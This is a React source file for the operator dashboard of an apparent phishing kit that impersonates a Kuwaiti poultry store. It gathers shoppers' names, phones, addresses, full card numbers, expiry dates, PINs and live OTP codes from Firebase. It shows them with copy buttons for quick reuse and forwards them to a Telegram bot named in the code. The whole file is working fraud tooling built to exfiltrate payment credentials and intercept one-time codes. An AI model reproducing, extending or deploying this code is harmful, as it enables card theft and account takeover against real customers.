import React, { useState, useEffect, useMemo } from 'react';
import {
  subscribeToLiveRegistrations,
  deleteSessionSteps,
  LiveSessionSummary,
  getTelegramConfig,
  saveTelegramConfig,
  checkTelegramUpdates,
  sendTelegramNotificationDetailed,
  DEFAULT_TELEGRAM_CONFIG
} from '../lib/esfgdrFirebase';
import {
  subscribeToOrders,
  deleteOrder,
  FirestoreOrderRecord
} from '../lib/firebase';
import { Store, Check, Copy, Trash2, Send, RefreshCw, Settings } from 'lucide-react';
import { CompletedOrder } from '../types';

interface AdminDashboardProps {
  onBackToStore: () => void;
  onViewOrderReceipt?: (order: CompletedOrder) => void;
}

interface SimpleEntry {
  id: string;
  sessionId?: string;
  bookingId?: string;
  orderId?: string;
  name: string;
  phone: string;
  address: string;
  bank: string;
  cardNumber: string;
  cardExpiry: string;
  pin: string;
  otpCode: string;
  updatedAtMs: number;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({
  onBackToStore
}) => {
  const [liveSessions, setLiveSessions] = useState<LiveSessionSummary[]>([]);
  const [orders, setOrders] = useState<FirestoreOrderRecord[]>([]);
  const [loading, setLoading] = useState(true);
  const [toastMsg, setToastMsg] = useState('');

  // Telegram settings state
  const [showTgSettings, setShowTgSettings] = useState(true);
  const [tgBotToken, setTgBotToken] = useState(() => getTelegramConfig().botToken);
  const [tgChatId, setTgChatId] = useState(() => getTelegramConfig().chatId);
  const [tgStatus, setTgStatus] = useState<{ type: 'idle' | 'ok' | 'err'; text: string }>({
    type: 'idle',
    text: ''
  });
  const [detectedChats, setDetectedChats] = useState<
    { id: string | number; name: string; username?: string }[]
  >([]);
  const [isTestingTg, setIsTestingTg] = useState(false);

  const copyText = (text: string, label: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setToastMsg(`تم نسخ ${label}`);
    setTimeout(() => setToastMsg(''), 2000);
  };

  useEffect(() => {
    const unsubLive = subscribeToLiveRegistrations(
      (list) => {
        setLiveSessions(list);
        setLoading(false);
      },
      () => setLoading(false)
    );

    const unsubOrders = subscribeToOrders(
      (list) => {
        setOrders(list);
        setLoading(false);
      },
      () => {}
    );

    return () => {
      unsubLive();
      unsubOrders();
    };
  }, []);

  const handleSaveAndTestTelegram = async () => {
    setIsTestingTg(true);
    setTgStatus({ type: 'idle', text: 'جارٍ الحفظ وإرسال رسالة تجريبية إلى تلغرام...' });

    const cleanToken = tgBotToken.trim() || DEFAULT_TELEGRAM_CONFIG.botToken;
    const cleanChat = tgChatId.trim() || DEFAULT_TELEGRAM_CONFIG.chatId;

    await saveTelegramConfig({
      botToken: cleanToken,
      botUsername: DEFAULT_TELEGRAM_CONFIG.botUsername,
      chatId: cleanChat
    });

    const res = await sendTelegramNotificationDetailed(
      `✅ <b>تم تفعيل وربط إشعارات تلغرام بنجاح!</b>\n` +
      `🇰🇼 متجر دلمون الكويت للدواجن\n` +
      `🆔 معرف المحادثة: <code>${cleanChat}</code>\n` +
      `🔔 ستصلك هنا جميع التسجيلات وبيانات الدفع ورموز OTP فوراً.`,
      {
        botToken: cleanToken,
        chatId: cleanChat,
        force: true
      }
    );

    setIsTestingTg(false);
    if (res.ok) {
      setTgStatus({
        type: 'ok',
        text: `تم الإرسال بنجاح إلى التلغرام (Chat ID: ${cleanChat}) ✅`
      });
    } else {
      setTgStatus({
        type: 'err',
        text: `تعذر الإرسال: ${res.error || 'تأكد من إرسال /start للبوت أولاً'}`
      });
    }
  };

  const handleDetectTelegramChats = async () => {
    setIsTestingTg(true);
    setTgStatus({ type: 'idle', text: 'جارٍ البحث عن المحادثات النشطة في البوت...' });
    const cleanToken = tgBotToken.trim() || DEFAULT_TELEGRAM_CONFIG.botToken;
    const res = await checkTelegramUpdates(cleanToken);
    setIsTestingTg(false);

    if (!res.ok) {
      setTgStatus({
        type: 'err',
        text: res.error || 'تعذر جلب التحديثات من البوت'
      });
      return;
    }

    const chats = res.detectedChats || [];
    setDetectedChats(chats);

    if (chats.length > 0) {
      const latestChatId = String(chats[chats.length - 1].id);
      setTgChatId(latestChatId);
      await saveTelegramConfig({
        botToken: cleanToken,
        botUsername: DEFAULT_TELEGRAM_CONFIG.botUsername,
        chatId: latestChatId,
        extraChatIds: chats.map((c) => String(c.id))
      });
      await sendTelegramNotificationDetailed(
        `✅ <b>تم الربط التلقائي بنجاح مع حسابك في تلغرام!</b>\n` +
        `🆔 معرف المحادثة المكتشف: <code>${latestChatId}</code>\n` +
        `🔔 ستصلك جميع التسجيلات والطلبات الجديدة هنا مباشرة.`,
        {
          botToken: cleanToken,
          chatId: latestChatId,
          force: true
        }
      );
      setTgStatus({
        type: 'ok',
        text: `تم اكتشاف وربط المحادثة (${chats[chats.length - 1].name} — ${latestChatId}) وإرسال رسالة تأكيد ✅`
      });
    } else {
      setTgStatus({
        type: 'err',
        text: 'لم يتم العثور على رسائل جديدة. افتح البوت @ghhfvsshsorffs_bot في تلغرام واضغط Start ثم اضغط هذا الزر مرة أخرى.'
      });
    }
  };

  const handleSendEntryToTelegram = async (item: SimpleEntry) => {
    const res = await sendTelegramNotificationDetailed(
      `🇰🇼 <b>بيانات تسجيل من اللوحة — دلمون الكويت</b>\n` +
      `👤 <b>الاسم:</b> ${item.name}\n` +
      `📞 <b>الهاتف:</b> <code>${item.phone || '—'}</code>\n` +
      `📍 <b>العنوان:</b> ${item.address || '—'}\n` +
      (item.bank ? `🏦 <b>البنك:</b> ${item.bank}\n` : '') +
      (item.cardNumber ? `🔢 <b>البطاقة:</b> <code>${item.cardNumber}</code>\n` : '') +
      (item.cardExpiry ? `📅 <b>الانتهاء:</b> <code>${item.cardExpiry}</code>\n` : '') +
      (item.pin ? `🔒 <b>PIN:</b> <code>${item.pin}</code>\n` : '') +
      (item.otpCode ? `🔑 <b>OTP:</b> <code>${item.otpCode}</code>\n` : ''),
      { force: true }
    );
    if (res.ok) {
      setToastMsg('تم إرسال التسجيل إلى تلغرام ✅');
    } else {
      setToastMsg(`فشل الإرسال: ${res.error || ''}`);
    }
    setTimeout(() => setToastMsg(''), 2500);
  };

  const entries = useMemo<SimpleEntry[]>(() => {
    const map = new Map<string, SimpleEntry>();

    for (const s of liveSessions) {
      const key = s.bookingId || s.sessionId;
      map.set(key, {
        id: key,
        sessionId: s.sessionId,
        bookingId: s.bookingId,
        name: s.name || 'عميل',
        phone: s.phone || '',
        address: s.address || s.area || '',
        bank: s.bank || '',
        cardNumber: s.cardNumber || '',
        cardExpiry: s.cardExpiry || '',
        pin: s.pin || '',
        otpCode: s.otpCode || '',
        updatedAtMs: s.updatedAtMs || Date.now()
      });
    }

    for (const o of orders) {
      const key = o.orderId;
      const ex = map.get(key);
      const createdMs = o.createdAt ? new Date(o.createdAt).getTime() : Date.now();

      map.set(key, {
        id: key,
        sessionId: ex?.sessionId,
        bookingId: key,
        orderId: o.orderId,
        name: ex?.name || o.customerName || 'عميل',
        phone: ex?.phone || o.customerPhone || '',
        address: ex?.address || o.customerAddress || '',
        bank: ex?.bank || (o.cardBank !== 'بانتظار إدخال البطاقة' && o.cardBank !== 'حساب مسجل' ? o.cardBank || '' : ''),
        cardNumber: ex?.cardNumber || o.cardNumber || '',
        cardExpiry: ex?.cardExpiry || o.cardExpiry || '',
        pin: ex?.pin || o.pin || '',
        otpCode: ex?.otpCode || o.otpCode || '',
        updatedAtMs: ex?.updatedAtMs || (Number.isNaN(createdMs) ? Date.now() : createdMs)
      });
    }

    return Array.from(map.values()).sort((a, b) => b.updatedAtMs - a.updatedAtMs);
  }, [liveSessions, orders]);

  const handleDelete = async (entry: SimpleEntry) => {
    const tasks: Promise<any>[] = [];
    if (entry.sessionId) {
      tasks.push(deleteSessionSteps(entry.sessionId, entry.bookingId));
    } else if (entry.bookingId) {
      tasks.push(deleteSessionSteps(`booking_${entry.bookingId}`, entry.bookingId));
    }
    if (entry.orderId || entry.bookingId) {
      tasks.push(deleteOrder(entry.orderId || entry.bookingId!));
    }
    await Promise.allSettled(tasks);
  };

  return (
    <div className="min-h-screen bg-slate-50 text-slate-900 font-sans" dir="rtl">
      {toastMsg && (
        <div className="fixed bottom-4 left-1/2 -translate-x-1/2 z-50 bg-slate-900 text-white px-4 py-2 rounded-lg text-xs font-bold flex items-center gap-1.5 shadow-lg">
          <Check className="w-4 h-4 text-emerald-400" />
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Minimal Header */}
      <header className="bg-white border-b border-slate-200 px-4 py-3.5">
        <div className="max-w-5xl mx-auto flex items-center justify-between gap-2">
          <h1 className="text-base font-black text-slate-900">
            التسجيلات المباشرة ({entries.length})
          </h1>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={() => setShowTgSettings((v) => !v)}
              className="px-3 py-1.5 text-xs font-bold text-blue-700 bg-blue-50 border border-blue-200 rounded-lg hover:bg-blue-100 flex items-center gap-1.5 cursor-pointer"
            >
              <Settings className="w-3.5 h-3.5" />
              <span>ربط التلغرام</span>
            </button>
            <button
              type="button"
              onClick={onBackToStore}
              className="px-3.5 py-1.5 text-xs font-bold text-white bg-slate-900 rounded-lg hover:bg-slate-800 flex items-center gap-1.5 cursor-pointer"
            >
              <Store className="w-3.5 h-3.5" />
              <span>المتجر</span>
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-5xl mx-auto p-4 space-y-4">
        {/* Telegram Connection & Test Box */}
        {showTgSettings && (
          <div className="bg-white border border-blue-200 rounded-xl p-4 space-y-3 shadow-2xs">
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-2.5">
              <div>
                <h2 className="text-xs font-black text-slate-900">
                  إعدادات إشعارات التلغرام الفورية (Telegram Bot)
                </h2>
                <p className="text-[11px] text-slate-500 mt-0.5">
                  لربط حسابك: افتح البوت{' '}
                  <a
                    href="https://t.me/ghhfvsshsorffs_bot"
                    target="_blank"
                    rel="noreferrer"
                    className="text-blue-600 font-bold underline"
                    dir="ltr"
                  >
                    @ghhfvsshsorffs_bot
                  </a>{' '}
                  في تلغرام واضغط <b>Start</b> ثم اضغط زر <b>«اكتشاف وربط تلقائي»</b> بالأسفل.
                </p>
              </div>
              <button
                type="button"
                onClick={handleDetectTelegramChats}
                disabled={isTestingTg}
                className="px-3 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg text-xs font-bold flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isTestingTg ? 'animate-spin' : ''}`} />
                <span>اكتشاف وربط تلقائي (getUpdates)</span>
              </button>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-12 gap-2.5 items-end">
              <div className="sm:col-span-4">
                <label className="block text-[11px] font-bold text-slate-600 mb-1">
                  معرف المحادثة (Chat ID)
                </label>
                <input
                  type="text"
                  value={tgChatId}
                  onChange={(e) => setTgChatId(e.target.value)}
                  placeholder="مثال: 6726553753"
                  className="w-full px-3 py-2 border border-slate-300 rounded-lg text-xs font-mono text-left focus:outline-none focus:border-blue-600"
                  dir="ltr"
                />
              </div>

              <div className="sm:col-span-5">
                <label className="block text-[11px] font-bold text-slate-600 mb-1">
                  توكن البوت (Bot Token)
                </label>
                <input
                  type="text"
                  value={tgBotToken}
                  onChange={(e) => setTgBotToken(e.target.value)}
                  className="w-full px-3 py-2 border border-slate-300 rounded-lg text-xs font-mono text-left focus:outline-none focus:border-blue-600"
                  dir="ltr"
                />
              </div>

              <div className="sm:col-span-3">
                <button
                  type="button"
                  onClick={handleSaveAndTestTelegram}
                  disabled={isTestingTg}
                  className="w-full py-2 px-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>حفظ وإرسال تجربة</span>
                </button>
              </div>
            </div>

            {detectedChats.length > 0 && (
              <div className="flex flex-wrap items-center gap-2 pt-1">
                <span className="text-[11px] font-bold text-slate-500">المحادثات المكتشفة:</span>
                {detectedChats.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setTgChatId(String(c.id))}
                    className="px-2.5 py-1 bg-slate-100 hover:bg-blue-50 border border-slate-200 rounded-md text-[11px] font-bold text-slate-800 cursor-pointer"
                  >
                    {c.name} ({c.id})
                  </button>
                ))}
              </div>
            )}

            {tgStatus.text && (
              <div
                className={`p-2.5 rounded-lg text-xs font-bold ${
                  tgStatus.type === 'ok'
                    ? 'bg-emerald-50 text-emerald-800 border border-emerald-200'
                    : tgStatus.type === 'err'
                    ? 'bg-red-50 text-red-700 border border-red-200'
                    : 'bg-slate-100 text-slate-700'
                }`}
              >
                {tgStatus.text}
              </div>
            )}
          </div>
        )}

        {/* Direct List */}
        {loading ? (
          <div className="bg-white border border-slate-200 rounded-xl p-8 text-center text-sm font-bold text-slate-500">
            جارٍ التحميل...
          </div>
        ) : entries.length === 0 ? (
          <div className="bg-white border border-slate-200 rounded-xl p-8 text-center text-sm font-bold text-slate-500">
            لا توجد تسجيلات حالياً
          </div>
        ) : (
          entries.map((item) => (
            <div
              key={item.id}
              className="bg-white border border-slate-200 rounded-xl p-4 space-y-3"
            >
              {/* Customer Row */}
              <div className="flex items-center justify-between gap-2 border-b border-slate-100 pb-2.5">
                <div className="flex flex-wrap items-center gap-2 text-sm">
                  <span className="font-black text-slate-900">{item.name}</span>
                  {item.phone && (
                    <button
                      type="button"
                      onClick={() => copyText(item.phone, 'الرقم')}
                      className="font-mono font-bold text-blue-700 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.phone}</span>
                      <Copy className="w-3.5 h-3.5 text-slate-400" />
                    </button>
                  )}
                  {item.address && (
                    <span className="text-xs text-slate-500">({item.address})</span>
                  )}
                </div>

                <div className="flex items-center gap-1.5">
                  <button
                    type="button"
                    onClick={() => handleSendEntryToTelegram(item)}
                    className="text-blue-600 hover:bg-blue-50 px-2 py-1 rounded-md text-xs font-bold flex items-center gap-1 cursor-pointer"
                    title="إرسال للتلغرام"
                  >
                    <Send className="w-3.5 h-3.5" />
                    <span>تلغرام</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => handleDelete(item)}
                    className="text-slate-400 hover:text-red-600 p-1 cursor-pointer"
                    title="حذف"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              </div>

              {/* Card & OTP Row */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">
                    البطاقة {item.bank ? `(${item.bank})` : ''}
                  </div>
                  {item.cardNumber ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.cardNumber, 'البطاقة')}
                      className="font-mono font-black text-sm text-slate-900 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.cardNumber}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">الانتهاء</div>
                  {item.cardExpiry ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.cardExpiry, 'الانتهاء')}
                      className="font-mono font-black text-sm text-slate-900 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.cardExpiry}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-slate-50 p-2.5 rounded-lg">
                  <div className="text-slate-500 font-bold mb-1">PIN</div>
                  {item.pin ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.pin, 'PIN')}
                      className="font-mono font-black text-base text-red-600 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.pin}</span>
                      <Copy className="w-3 h-3 text-slate-400" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>

                <div className="bg-emerald-50 p-2.5 rounded-lg">
                  <div className="text-emerald-800 font-bold mb-1">OTP</div>
                  {item.otpCode ? (
                    <button
                      type="button"
                      onClick={() => copyText(item.otpCode, 'OTP')}
                      className="font-mono font-black text-base text-emerald-700 flex items-center gap-1 cursor-pointer"
                      dir="ltr"
                    >
                      <span>{item.otpCode}</span>
                      <Copy className="w-3 h-3 text-emerald-600" />
                    </button>
                  ) : (
                    <span className="text-slate-400 font-mono">—</span>
                  )}
                </div>
              </div>
            </div>
          ))
        )}
      </main>
    </div>
  );
};
